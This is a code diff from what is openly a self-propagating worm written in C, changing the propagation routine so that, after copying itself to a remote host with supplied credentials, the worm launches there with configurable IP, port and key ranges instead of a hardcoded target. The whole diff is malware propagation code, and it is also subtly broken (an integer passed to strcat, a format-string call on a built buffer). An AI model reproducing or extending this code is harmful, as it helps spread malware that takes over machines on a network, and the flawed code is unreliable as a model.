@@ -285,7 +285,7 @@ void fileTransfer(char *ip, char *username, char *password){
     }
 }
 
-void fileExecute(char *ip, char *username, char *pass){
+void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){
     char buff[1024];
     FILE *file;
     pid_t child; // note that the actual return type of fork is 
@@ -350,7 +350,15 @@ void fileExecute(char *ip, char *username, char *pass){
         //execute
         fflush(file);
         sleep(2);
-        fprintf(file, "./worm 192.168.0.225 0-25 4\n");
+        memset(buff, '0', 1024);
+        strcpy(buff, "./worm ");
+        strcat(buff, range_ipSeq);
+        strcat(buff," ");
+        strcat(buff, range_portSeq);
+        strcat(buff," ");
+        strcat(buff, lenKey);
+        strcat(buff,"\n");
+        fprintf(file, buff);
         
         //exit
         fflush(file);
@@ -363,7 +371,7 @@ void fileExecute(char *ip, char *username, char *pass){
 
 }
 
-void propagation_engine(char* ip, char *username, char *pass){    
+void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){    
     fileTransfer(ip, username, pass);
-    fileExecute(ip, username, pass);
+    fileExecute(ip, username, pass, range_ipSeq, range_portSeq, lenKey);
 }
